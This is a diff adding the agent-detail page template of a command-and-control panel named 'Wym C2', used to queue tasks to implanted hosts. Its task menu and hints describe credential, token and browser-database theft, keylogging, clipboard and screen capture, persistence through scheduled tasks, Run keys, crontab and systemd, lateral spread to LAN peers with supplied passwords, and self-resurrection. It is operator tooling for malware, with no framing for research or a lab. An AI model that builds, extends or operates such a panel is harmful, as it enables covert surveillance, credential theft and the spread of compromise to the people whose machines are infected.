@@ -1,0 +1,289 @@
+﻿{% extends "base.html" %}
+{% block title %}{{ agent.hostname }} - Wym C2{% endblock %}
+{% block content %}
+<a href="/dashboard" class="text-sm text-muted hover:text-accent transition inline-flex items-center gap-1 mb-4">
+  <svg class="w-3.5 h-3.5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 19l-7-7 7-7"/></svg>
+  all agents
+</a>
+
+<div class="flex items-center gap-3 mb-4 flex-wrap">
+  <h1 class="text-xl font-bold text-accent">{{ agent.hostname }}</h1>
+  {% set pill_colors = {'alive': 'bg-green-500/10 border-green-500/30 text-green-400', 'stale': 'bg-yellow-500/10 border-yellow-500/30 text-yellow-400', 'dead': 'bg-red-500/10 border-red-500/30 text-red-400'} %}
+  <span class="px-2.5 py-0.5 text-xs font-mono border rounded-full {{ pill_colors.get(status, '') }}">{{ status }}</span>
+  <span class="text-xs font-mono text-muted">{{ agent.id }}</span>
+</div>
+
+{% if agent.note %}
+<div class="flex items-center justify-between bg-dark-600 border border-dark-400 rounded-lg px-4 py-2.5 mb-3">
+  <span class="text-sm"><b class="text-muted">Note:</b> {{ agent.note }}
+    {% if agent.note_by %}<span class="text-xs text-muted ml-2"> by <span class="text-accent font-mono">{{ agent.note_by }}</span></span>{% endif %}
+  </span>
+  <form method="post" action="/agents/{{ agent.id }}/note/delete">
+    <input type="hidden" name="csrf_token" value="{{ csrf_token }}">
+    <button type="submit" class="text-muted hover:text-red-400 transition text-sm cursor-pointer" title="delete note">&#10005;</button>
+  </form>
+</div>
+{% endif %}
+<form method="post" action="/agents/{{ agent.id }}/note" class="flex gap-2 mb-4">
+  <input type="hidden" name="csrf_token" value="{{ csrf_token }}">
+  <input type="text" name="note" placeholder="Set/update operator note..." value="{{ agent.note or '' }}" autocomplete="off"
+    class="flex-1 bg-dark-800 border border-dark-400 rounded-lg px-3 py-1.5 text-sm font-mono text-gray-200 placeholder-gray-600 focus:border-accent outline-none">
+  <button type="submit" class="px-3 py-1.5 text-xs font-mono border border-dark-400 text-gray-300 rounded-lg hover:bg-accent/10 hover:text-accent hover:border-accent/30 transition cursor-pointer">Save</button>
+</form>
+
+<div class="grid grid-cols-2 md:grid-cols-4 lg:grid-cols-7 gap-3 mb-6">
+  {% set cards = [
+    ('User', agent.username or '-'),
+    ('OS', (agent.os or '-') ~ ' ' ~ (agent.arch or '')),
+    ('Type / Version', (agent.type or '-') ~ ' / ' ~ (agent.version or '-')),
+    ('IP', agent.ip or '-'),
+    ('PID', agent.pid or '-'),
+    ('First seen', agent.first_seen),
+    ('Last seen', agent.last_seen),
+  ] %}
+  {% for label, val in cards %}
+  <div class="bg-dark-600 border border-dark-400 rounded-lg px-3 py-2.5">
+    <div class="text-[10px] text-muted uppercase tracking-wider mb-1">{{ label }}</div>
+    <div class="font-mono text-sm truncate" title="{{ val }}">{{ val }}</div>
+  </div>
+  {% endfor %}
+</div>
+
+<h2 class="text-sm font-bold text-accent uppercase tracking-wider mb-3">Queue Task</h2>
+<form method="post" action="/agents/{{ agent.id }}/tasks" class="space-y-3 mb-3">
+  <input type="hidden" name="csrf_token" value="{{ csrf_token }}">
+  <div class="flex flex-wrap gap-3">
+    <select name="task_type" id="task-type"
+      class="bg-dark-800 border border-dark-400 rounded-lg px-3 py-2 text-sm font-mono text-gray-200 focus:border-accent outline-none">
+      <option value="shell" {% if selected_type|default('shell')=='shell' %}selected{% endif %}>shell</option>
+      <option value="download" {% if selected_type|default('')=='download' %}selected{% endif %}>download</option>
+      <option value="upload" {% if selected_type|default('')=='upload' %}selected{% endif %}>upload</option>
+      <option value="clipboard" {% if selected_type|default('')=='clipboard' %}selected{% endif %}>clipboard</option>
+      <option value="keylog" {% if selected_type|default('')=='keylog' %}selected{% endif %}>keylog</option>
+      <option value="screenshot" {% if selected_type|default('')=='screenshot' %}selected{% endif %}>screenshot</option>
+      <option value="steal" {% if selected_type|default('')=='steal' %}selected{% endif %}>steal</option>
+      <option value="clone" {% if selected_type|default('')=='clone' %}selected{% endif %}>clone</option>
+      <option value="persistence" {% if selected_type|default('')=='persistence' %}selected{% endif %}>persistence</option>
+      <option value="lateral" {% if selected_type|default('')=='lateral' %}selected{% endif %}>lateral</option>
+      <option value="sleep" {% if selected_type|default('')=='sleep' %}selected{% endif %}>sleep</option>
+      <option value="exit" {% if selected_type|default('')=='exit' %}selected{% endif %}>exit</option>
+    </select>
+    <input type="text" id="task-payload" name="payload" placeholder="command / file name / path / seconds" autocomplete="off" spellcheck="false"
+      class="flex-1 min-w-[200px] bg-dark-800 border border-dark-400 rounded-lg px-3 py-2 text-sm font-mono text-gray-200 placeholder-gray-600 focus:border-accent outline-none">
+    <input type="text" id="task-command" name="command" class="hidden flex-1 min-w-[200px] bg-dark-800 border border-dark-400 rounded-lg px-3 py-2 text-sm font-mono text-gray-200 placeholder-gray-600 focus:border-accent outline-none"
+      placeholder="relaunch command when target dies (e.g. python agent.py --server ... --token ...)" autocomplete="off" spellcheck="false">
+    <select id="task-command-preset" disabled
+      class="hidden bg-dark-800 border border-dark-400 rounded-lg px-2 py-2 text-xs font-mono text-gray-400 focus:border-accent outline-none">
+      <option value="">preset relaunch</option>
+      <option value="py">python agent.py --server {{ request.base_url }} --token <TOKEN></option>
+      <option value="schtasks">schtasks /Run /TN "C2Agent"</option>
+      <option value="service">Start-Service C2Agent</option>
+    </select>
+    <input type="text" id="task-destination" name="destination" class="hidden flex-1 min-w-[200px] bg-dark-800 border border-dark-400 rounded-lg px-3 py-2 text-sm font-mono text-gray-200 placeholder-gray-600 focus:border-accent outline-none"
+      placeholder="destination path (optional)" autocomplete="off">
+    <select name="destination" id="task-clone-target" disabled
+      class="hidden flex-1 min-w-[200px] bg-dark-800 border border-dark-400 rounded-lg px-3 py-2 text-sm font-mono text-gray-200 focus:border-accent outline-none">
+      <option value="">target agent (empty = this agent)</option>
+    </select>
+    <input type="text" id="task-timeout" name="timeout" class="hidden w-40 bg-dark-800 border border-dark-400 rounded-lg px-3 py-2 text-sm font-mono text-gray-200 placeholder-gray-600 focus:border-accent outline-none"
+      placeholder="timeout (optional, 120s)" autocomplete="off" inputmode="numeric">
+    <button type="submit" class="px-4 py-2 text-xs font-mono font-bold bg-accent/10 border border-accent/30 text-accent rounded-lg hover:bg-accent/20 transition cursor-pointer">Queue task</button>
+  </div>
+</form>
+<p class="text-xs text-muted mb-6" id="task-hint">Runs via the agent's shell. Output truncated at 12000 chars.</p>
+
+<h2 class="text-sm font-bold text-accent uppercase tracking-wider mb-3">Collected Files</h2>
+{% if files %}
+<div class="bg-dark-600 border border-dark-400 rounded-xl overflow-hidden mb-6">
+  <ul class="divide-y divide-dark-400/50">
+    {% for f in files %}
+    <li class="flex items-center justify-between px-4 py-2 hover:bg-dark-500/50 transition gap-3">
+      <a href="/collected/{{ f }}" class="font-mono text-sm text-accent hover:underline truncate" title="{{ f }}">{{ f }}</a>
+      <form method="post" action="/collected/delete" class="inline shrink-0" onsubmit="return confirm('Delete {{ f }}?')">
+        <input type="hidden" name="csrf_token" value="{{ csrf_token }}">
+        <input type="hidden" name="name" value="{{ f }}">
+        <input type="hidden" name="redirect" value="/agents/{{ agent.id }}">
+        <button class="px-2 py-1 text-[10px] font-mono border border-red-500/30 text-red-400 rounded hover:bg-red-500/10 transition cursor-pointer">delete</button>
+      </form>
+    </li>
+    {% endfor %}
+  </ul>
+</div>
+{% else %}
+<p class="text-sm text-muted mb-6">nothing collected yet - queue an <b>upload</b> task</p>
+{% endif %}
+
+<h2 class="text-sm font-bold text-accent uppercase tracking-wider mb-3">Task History</h2>
+<div class="bg-dark-600 border border-dark-400 rounded-xl overflow-hidden">
+  <table class="w-full text-sm">
+    <thead>
+      <tr class="text-muted text-xs uppercase bg-dark-700 border-b border-dark-400">
+        <th class="px-3 py-2.5 text-left">Time</th>
+        <th class="px-3 py-2.5 text-left">Type</th>
+        <th class="px-3 py-2.5 text-left">Args</th>
+        <th class="px-3 py-2.5 text-left">Status</th>
+        <th class="px-3 py-2.5 text-left">Exit</th>
+        <th class="px-3 py-2.5 text-left">Output</th>
+        <th class="px-3 py-2.5 text-right"></th>
+      </tr>
+    </thead>
+    <tbody id="tasks-tbody">
+      <tr><td colspan="7" class="px-3 py-8 text-center text-muted">loading...</td></tr>
+    </tbody>
+  </table>
+</div>
+{% endblock %}
+
+{% block scripts %}
+<script>
+  const AGENT_ID = {{ agent.id | tojson }};
+  const HINTS = {
+    shell:    'Runs via the agent\'s shell. Output is truncated at 12000 chars.',
+    download: 'Name of a file staged in the server "shared" folder. The agent saves it to its working directory.',
+    upload:   'Absolute path of a file on the agent machine (e.g. C:\\Temp\\dump.txt or /etc/passwd).',
+    clipboard:'Action: get (read clipboard) or set (write clipboard). For set, put the text in the "destination" field.',
+    keylog:   'Action: start (begin recording), stop (stop recording), or dump (return buffered keystrokes).',
+    screenshot: 'Captures the screen and uploads the PNG to the server (collected files). Optional filename label.',
+    steal: 'Profile: all | env | tokens | browser. Collects env vars, credential/token files and raw browser DBs, zips and uploads to collected files. No decryption on the agent side.',
+    clone: 'Action: start (monitor target + relaunch when dead) | stop | status. Target agent is selected in "target agent", relaunch command goes in "relaunch command", timeout = check interval (s). Powers cross-agent resurrection (self or a companion).',
+    persistence: 'Copies this agent to a persistent path and registers it to relaunch on logon/reboot with the same server/token/interval. Windows: scheduled task (c2agent-persist) + HKCU Run fallback. Linux/macOS: @reboot crontab + systemd --user unit.',
+    lateral: 'Discovers LAN peers (arp/ip neigh) and tries to copy+launch this same agent on them. Payload = optional subnet CIDR (or user:pass@CIDR), destination = user, command = password. Without credentials discovery still runs but deploy is skipped.',
+    sleep:    'Heartbeat interval in seconds (min 1).',
+    exit:     'Agent terminates immediately.',
+  };
+  const payloadInput = document.getElementById('task-payload');
+  const destField = document.getElementById('task-destination');
+  const timeoutField = document.getElementById('task-timeout');
+  const commandField = document.getElementById('task-command');
+  const commandPreset = document.getElementById('task-command-preset');
+  const cloneTarget = document.getElementById('task-clone-target');
+  const typeSelect = document.getElementById('task-type');
+
+  function populateCloneTargets() {
+    fetch('/api/agents').then(r => r.json()).then(d => {
+      d.agents.forEach(a => {
+        const o = document.createElement('option');
+        o.value = a.id;
+        o.textContent = `${a.id.slice(0, 8)} ${a.hostname} (${a.os}/${a.arch})`;
+        cloneTarget.appendChild(o);
+      });
+    }).catch(() => {});
+  }
+  populateCloneTargets();
+
+  function syncFields() {
+    const t = typeSelect.value;
+    document.getElementById('task-hint').textContent = HINTS[t] || '';
+    destField.classList.toggle('hidden', t !== 'download' && t !== 'clipboard' && t !== 'lateral');
+    cloneTarget.classList.toggle('hidden', t !== 'clone');
+    cloneTarget.disabled = t !== 'clone';
+    commandField.classList.toggle('hidden', t !== 'clone' && t !== 'lateral');
+    commandField.disabled = t !== 'clone' && t !== 'lateral';
+    commandPreset.classList.toggle('hidden', t !== 'clone');
+    commandPreset.disabled = t !== 'clone';
+    timeoutField.classList.toggle('hidden', t !== 'shell' && t !== 'clone');
+    if (t === 'download') payloadInput.placeholder = 'file name in shared folder';
+    else if (t === 'upload') payloadInput.placeholder = 'absolute path on agent';
+    else if (t === 'clipboard') payloadInput.placeholder = 'get / set';
+    else if (t === 'keylog') payloadInput.placeholder = 'start / stop / dump';
+    else if (t === 'screenshot') payloadInput.placeholder = 'filename label (optional)';
+    else if (t === 'steal') payloadInput.placeholder = 'all / env / tokens / browser (default all)';
+    else if (t === 'clone') payloadInput.placeholder = 'start / stop / status';
+    else if (t === 'persistence') payloadInput.placeholder = '--- (no args)';
+    else if (t === 'lateral') payloadInput.placeholder = 'subnet CIDR (optional) or user:pass@CIDR';
+    else if (t === 'sleep') payloadInput.placeholder = 'seconds (min 1)';
+    else if (t === 'exit') payloadInput.placeholder = '---';
+    else payloadInput.placeholder = 'shell command (e.g. whoami /all)';
+    if (t === 'clone') timeoutField.placeholder = 'check interval s (default 30)';
+    else timeoutField.placeholder = 'timeout (optional, 120s)';
+    if (t === 'clipboard') destField.placeholder = 'text to set (only for set action)';
+    else if (t === 'lateral') destField.placeholder = 'user (optional)';
+    else destField.placeholder = 'destination path (optional)';
+    if (t === 'lateral') commandField.placeholder = 'password (optional; agents also read C2_LAT_USER/C2_LAT_PASS)';
+    else commandField.placeholder = 'relaunch command when target dies (e.g. python agent.py --server ... --token ...)';
+  }
+  typeSelect.addEventListener('change', syncFields);
+  syncFields();
+
+  commandPreset.addEventListener('change', () => {
+    if (commandPreset.value === 'py') {
+      commandField.value = "python agent.py --server " + location.origin + " --token <TOKEN> --interval 10 --jitter 2";
+    } else if (commandPreset.value === 'schtasks') {
+      commandField.value = 'schtasks /Run /TN "C2Agent"';
+    } else if (commandPreset.value === 'service') {
+      commandField.value = 'Start-Service C2Agent';
+    }
+    commandPreset.value = '';
+  });
+
+  setInterval(loadTasks, 5000);
+  loadTasks();
+
+  function taskPill(status, text) {
+    const c = { completed: 'bg-green-500/10 border-green-500/30 text-green-400', failed: 'bg-red-500/10 border-red-500/30 text-red-400', pending: 'bg-yellow-500/10 border-yellow-500/30 text-yellow-400', sent: 'bg-blue-500/10 border-blue-500/30 text-blue-400', cancelled: 'bg-gray-500/10 border-gray-500/30 text-gray-400' };
+    return `<span class="inline-block px-2 py-0.5 text-[10px] font-mono border rounded-full ${c[status] || ''}">${esc(text)}</span>`;
+  }
+
+  async function loadTasks() {
+    try {
+      const r = await fetch('/api/agents/' + AGENT_ID + '/tasks');
+      if (!r.ok) return;
+      const data = await r.json();
+      const tbody = document.getElementById('tasks-tbody');
+      if (!data.tasks.length) {
+        tbody.innerHTML = '<tr><td colspan="7" class="px-3 py-8 text-center text-muted">no tasks yet</td></tr>';
+        return;
+      }
+      tbody.innerHTML = data.tasks.map(t => {
+        let action = '';
+        const hasOutput = t.result && t.result.length > 0;
+        if (hasOutput) {
+          const full = esc(t.args || '') + '\n\n' + esc(t.result || '');
+          action += `<button onclick="showDetail(this)" data-full="${full}" class="px-1.5 py-0.5 text-[10px] font-mono border border-accent/30 text-accent rounded hover:bg-accent/10 cursor-pointer">detail</button> `;
+        }
+        if(t.status === 'pending') action += `<form method="post" action="/tasks/${t.id}/cancel" class="inline"><input type="hidden" name="csrf_token" value="${CSRF_TOKEN}"><button class="px-2 py-1 text-[10px] font-mono border border-dark-400 text-muted rounded hover:text-gray-200 cursor-pointer">cancel</button></form>`;
+        else if(t.status === 'sent' || t.status === 'failed') action += `<form method="post" action="/tasks/${t.id}/requeue" class="inline"><input type="hidden" name="csrf_token" value="${CSRF_TOKEN}"><button class="px-2 py-1 text-[10px] font-mono border border-dark-400 text-muted rounded hover:text-gray-200 cursor-pointer">re-queue</button></form>`;
+        const outputShort = esc(t.result || '');
+        return `<tr class="border-b border-dark-400/50 hover:bg-dark-500/50 transition">
+          <td class="px-3 py-2 text-xs text-muted" title="${esc(t.created_at)}">${ago(t.created_at)}</td>
+          <td class="px-3 py-2">${taskPill(t.status === 'completed' ? 'completed' : t.status === 'failed' ? 'failed' : 'pending', t.type)}</td>
+          <td class="px-3 py-2 font-mono text-xs max-w-[200px] truncate" title="${esc(t.args)}">${esc(t.args)}</td>
+          <td class="px-3 py-2">${taskPill(t.status, t.status)}</td>
+          <td class="px-3 py-2 font-mono text-xs text-muted">${t.exit_code !== null && t.exit_code !== undefined ? t.exit_code : '-'}</td>
+          <td class="px-3 py-2 font-mono text-xs max-w-[300px] truncate text-muted" title="${outputShort}">${outputShort}</td>
+          <td class="px-3 py-2 text-right whitespace-nowrap">${action}</td>
+        </tr>`;
+      }).join('');
+    } catch (e) { /* transient */ }
+  }
+  function showDetail(btn) {
+    const full = btn.getAttribute('data-full');
+    let overlay = document.getElementById('detail-overlay');
+    if (!overlay) {
+      overlay = document.createElement('div');
+      overlay.id = 'detail-overlay';
+      overlay.className = 'fixed inset-0 z-50';
+      overlay.innerHTML = `
+        <div class="absolute inset-0 bg-black/70 backdrop-blur-sm" id="detail-backdrop"></div>
+        <div class="relative max-w-4xl mx-auto mt-16 bg-dark-600 border border-dark-400 rounded-xl shadow-2xl overflow-hidden" style="max-height:80vh;">
+          <div class="flex items-center justify-between px-4 py-3 border-b border-dark-400 bg-dark-700">
+            <span class="text-sm font-bold text-accent uppercase tracking-wider">Task Output</span>
+            <button id="detail-close" class="text-muted hover:text-accent transition p-1 cursor-pointer">
+              <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"/></svg>
+            </button>
+          </div>
+          <pre class="p-4 overflow-auto font-mono text-xs text-gray-300 leading-relaxed whitespace-pre-wrap" id="detail-content" style="max-height:calc(80vh - 50px);"></pre>
+        </div>`;
+      document.body.appendChild(overlay);
+      document.getElementById('detail-backdrop').onclick = closeDetail;
+      document.getElementById('detail-close').onclick = closeDetail;
+    }
+    document.getElementById('detail-content').textContent = full;
+    overlay.style.display = '';
+  }
+  function closeDetail() {
+    const o = document.getElementById('detail-overlay');
+    if (o) o.style.display = 'none';
+  }
+</script>
+{% endblock %}
